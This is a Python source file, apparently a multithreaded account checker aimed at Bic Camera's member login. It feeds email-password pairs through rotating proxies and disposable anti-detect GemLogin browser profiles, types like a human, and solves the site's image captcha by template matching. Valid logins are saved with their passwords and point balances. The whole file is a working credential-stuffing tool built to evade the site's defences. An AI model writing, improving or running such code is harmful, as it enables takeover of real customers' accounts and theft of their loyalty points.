import os
import random
import sys
import cv2
import time
import atexit
import signal
import math
import logging
import threading
import importlib.util
from queue import Queue
from datetime import datetime

import colorama
import numpy as np
import pyautogui
from playwright.sync_api import sync_playwright


# Load GemLogin API from file name with hyphen: gemlogin-api.py
_GEMLOGIN_PATH = os.path.join(os.path.dirname(__file__), "gemlogin-api.py")
_spec = importlib.util.spec_from_file_location("gemlogin_api_module", _GEMLOGIN_PATH)
if _spec is None or _spec.loader is None:
    raise RuntimeError("Khong the nap gemlogin-api.py")
_gemlogin_module = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_gemlogin_module)
GemLoginAPI = _gemlogin_module.GemLoginAPI


colorama.init()
os.makedirs("./debug", exist_ok=True)

successful_accounts = []
failed_accounts = []
opened_browsers = []
opened_profiles = []

file_lock = threading.Lock()
resource_lock = threading.Lock()


COLOR_RESET = "\033[0m"
COLOR_INFO = "\033[32m"
COLOR_WARNING = "\033[33m"
COLOR_ERROR = "\033[31m"


class ColorFormatter(logging.Formatter):
    def format(self, record):
        color = ""
        if record.levelno == logging.INFO:
            color = COLOR_INFO
        elif record.levelno == logging.WARNING:
            color = COLOR_WARNING
        elif record.levelno == logging.ERROR:
            color = COLOR_ERROR
        return f"{color}{super().format(record)}{COLOR_RESET}"

    def formatTime(self, record, datefmt=None):
        dt = datetime.fromtimestamp(record.created)
        return dt.strftime("%H:%M")


console_handler = logging.StreamHandler()
console_handler.setFormatter(ColorFormatter("%(asctime)s - %(levelname)s - %(message)s"))

file_handler = logging.FileHandler("gemlogin_automation.log", encoding="utf-8")
file_handler.setFormatter(
    logging.Formatter("%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s")
)

logging.basicConfig(level=logging.INFO, handlers=[file_handler, console_handler])
logging.getLogger("playwright").setLevel(logging.WARNING)


def load_input_files():
    accounts = []
    proxies = []

    with open("accounts.txt", "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#") and "||" in line:
                parts = line.split("||")
                if len(parts) >= 2:
                    accounts.append({"email": parts[0].strip(), "password": parts[1].strip()})

    try:
        with open("proxy.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    proxies.append(line)
    except FileNotFoundError:
        logging.warning("proxy.txt khong ton tai, chay khong proxy")

    if not accounts:
        raise ValueError("Khong co tai khoan hop le trong accounts.txt")

    logging.info(f"Da tai {len(accounts)} tai khoan va {len(proxies)} proxy")
    return accounts, proxies


def compute_grid(num_windows, screen_width, screen_height):
    cols = max(1, math.ceil(math.sqrt(num_windows)))
    rows = max(1, math.ceil(num_windows / cols))
    cell_w = max(320, screen_width // cols)
    cell_h = max(320, screen_height // rows)
    return rows, cols, cell_w, cell_h


def get_window_rect(index, num_windows):
    screen_width, screen_height = pyautogui.size()
    rows, cols = 3, 4
    cell_w = max(320, screen_width // cols)
    cell_h = max(320, screen_height // rows)

    # Keep positions within a fixed 3x4 grid (12 slots), then wrap to 1x1.
    slot = index % (rows * cols)

    row = slot // cols
    col = slot % cols

    x = col * cell_w
    y = row * cell_h

    # GemLogin API uses "x,y" for win_pos and "width,height" for win_size
    return f"{x},{y}", f"{cell_w},{cell_h}"


def normalize_cdp_endpoint(address):
    if not address:
        return None
    if address.startswith("ws://") or address.startswith("wss://"):
        return address
    if address.startswith("http://") or address.startswith("https://"):
        return address
    return f"http://{address}"


def load_template():
    template = cv2.imread("./captcha.png", 0)
    if template is None:
        logging.warning("Khong doc duoc captcha.png, bo qua logic giai captcha theo template")
    return template


def is_match(template, img):
    if template is None or img is None:
        return False

    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    h, w = template.shape
    gray = cv2.resize(gray, (w, h))
    res = cv2.matchTemplate(gray, template, cv2.TM_CCOEFF_NORMED)
    max_val = float(np.max(res))
    return max_val > 0.7


def solve_captcha(page, template):
    try:
        page.wait_for_selector(".login_img_div", timeout=5000)
        time.sleep(1)
    except Exception:
        return False

    items = page.locator(".login_img_div")
    count = items.count()
    clicked = 0

    for i in range(count):
        item = items.nth(i)
        try:
            img_el = item.locator(".login_img_btn_off img")
            img_bytes = img_el.screenshot()
            img_np = np.frombuffer(img_bytes, np.uint8)
            img = cv2.imdecode(img_np, cv2.IMREAD_COLOR)
            if is_match(template, img):
                item.click()
                clicked += 1
                time.sleep(0.3)
        except Exception:
            continue

    return clicked > 0


def check_account(browser, email, password, template):
    page = None
    debug_needed = False
    try:
        page = browser.new_page()
        page.goto("https://www.biccamera.com/bc/member/MemMyPage.jsp", wait_until="commit", timeout=15000)
        page.wait_for_timeout(3000)

        email_input = page.locator('input[type="text"]').first
        email_input.click()
        email_input.type(email, delay=random.randint(50, 150))

        password_input = page.locator('input[type="password"]')
        password_input.click()
        password_input.type(password, delay=random.randint(50, 150))

        login_button = page.locator('button[type="submit"]')
        login_button.click()
        time.sleep(2)

        for _ in range(3):
            if page.locator("#login_imagecheck").count() > 0:
                solve_captcha(page, template)
                time.sleep(1)
                login_button.click()
                time.sleep(3)
                if page.locator("#login_imagecheck").count() == 0:
                    break
            else:
                break

        page.wait_for_timeout(3000)

        html_source = page.content()
        if "Secure Connection Failed" in html_source or "This site can't be reached" in html_source or "ERR_HTTP2_PROTOCOL_ERROR" in html_source:
            debug_needed = True
            return False, "Ket noi bi chan - co the do proxy"

        if "SfrLogin.jsp" in page.url:
            debug_needed = True
            return False, "Acc Die"

        try:
            personal_point = page.locator("span.bcs_red").first.inner_text()
            return True, f"Diem ca nhan: {personal_point}"
        except Exception:
            try:
                personal_point = page.locator("#bcs_top_personal_point").inner_text()
                return True, f"Diem ca nhan: {personal_point}"
            except Exception:
                debug_needed = True
                return True, "Dang nhap thanh cong (khong doc duoc diem)"
    except Exception as e:
        debug_needed = True
        return False, repr(e)
    # finally:
    #     if debug_needed and page is not None:
    #         try:
    #             screenshot_path = os.path.join("debug", f"{email.replace('@', '_').replace('.', '_')}.png")
    #             page.screenshot(path=screenshot_path, full_page=True)
    #         except Exception:
    #             pass


def cleanup_resources():
    logging.warning("Dang don dep resources...")
    with resource_lock:
        for browser in opened_browsers[:]:
            try:
                browser.close()
            except Exception:
                pass
            finally:
                if browser in opened_browsers:
                    opened_browsers.remove(browser)

        gemlogin = GemLoginAPI()
        for profile_id in opened_profiles[:]:
            try:
                gemlogin.close_profile(profile_id)
                gemlogin.delete_profile(profile_id)
            except Exception:
                pass
            finally:
                if profile_id in opened_profiles:
                    opened_profiles.remove(profile_id)


def signal_handler(sig, frame):
    logging.info("Nhan tin hieu dung. Dang don dep...")
    cleanup_resources()
    sys.exit(0)


def worker(account_queue, proxies, num_threads, template):
    gemlogin = GemLoginAPI()

    while True:
        profile_id = None
        cdp_browser = None
        has_item = False
        try:
            account, account_index = account_queue.get_nowait()
            has_item = True
        except Exception:
            break

        email = account["email"]
        password = account["password"]

        try:
            proxy = proxies[account_index % len(proxies)] if proxies else ""
            win_pos, win_size = get_window_rect(account_index, num_threads)

            profile_id = gemlogin.create_profile(proxy, f"Profile_{email}")
            if not profile_id:
                raise Exception(f"Khong tao duoc profile cho {email}")

            with resource_lock:
                opened_profiles.append(profile_id)

            profile_data = gemlogin.start_profile(profile_id)
            if not profile_data:
                raise Exception(f"Khong khoi dong duoc profile cho {email}")

            remote_debugging_address = (
                profile_data.get("remote_debugging_address")
                or profile_data.get("debugging_address")
                or profile_data.get("debuggerAddress")
                or profile_data.get("remoteDebuggingAddress")
            )
            cdp_endpoint = normalize_cdp_endpoint(remote_debugging_address)
            if not cdp_endpoint:
                raise Exception(f"Khong co remote_debugging_address cho {email}")

            with sync_playwright() as p:
                cdp_browser = p.chromium.connect_over_cdp(cdp_endpoint)
                with resource_lock:
                    opened_browsers.append(cdp_browser)

                if cdp_browser.contexts:
                    context = cdp_browser.contexts[0]
                else:
                    context = cdp_browser.new_context()
                success, message = check_account(context, email, password, template)

                with file_lock:
                    if success:
                        successful_accounts.append(account)
                        with open("successful_accounts.txt", "a", encoding="utf-8") as f:
                            f.write(f"{email}|{password}|{message}\n")
                        logging.info(f"Dang nhap thanh cong: {email}")
                    else:
                        failed_accounts.append({"account": account, "error": message})
                        with open("failed_accounts.txt", "a", encoding="utf-8") as f:
                            f.write(f"{email}|{password}|{message}\n")
                        logging.warning(f"Dang nhap that bai: {email} - {message}")

        except Exception as e:
            with file_lock:
                failed_accounts.append({"account": account, "error": repr(e)})
                with open("failed_accounts.txt", "a", encoding="utf-8") as f:
                    f.write(f"{email}|{password}|{repr(e)}\n")
            logging.error(f"Loi worker cho {email}: {repr(e)}")

        finally:
            if cdp_browser is not None:
                try:
                    cdp_browser.close()
                except Exception:
                    pass
                with resource_lock:
                    if cdp_browser in opened_browsers:
                        opened_browsers.remove(cdp_browser)

            if profile_id is not None:
                try:
                    gemlogin.close_profile(profile_id)
                    gemlogin.delete_profile(profile_id)
                except Exception:
                    pass
                with resource_lock:
                    if profile_id in opened_profiles:
                        opened_profiles.remove(profile_id)

            if has_item:
                account_queue.task_done()


def main():
    accounts, proxies = load_input_files()

    try:
        num_threads = int(input("Nhap so luong de chay: "))
        if num_threads <= 0:
            num_threads = 1
    except ValueError:
        num_threads = 1

    num_threads = min(num_threads, len(accounts))
    template = load_template()

    account_queue = Queue()
    for idx, account in enumerate(accounts):
        account_queue.put((account, idx))

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    atexit.register(cleanup_resources)

    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(account_queue, proxies, num_threads, template), name=f"Luong-{i+1}")
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    logging.info("Da xu ly xong tat ca tai khoan")
    logging.info(f"Thanh cong: {len(successful_accounts)}")
    logging.info(f"That bai: {len(failed_accounts)}")


if __name__ == "__main__":
    main()
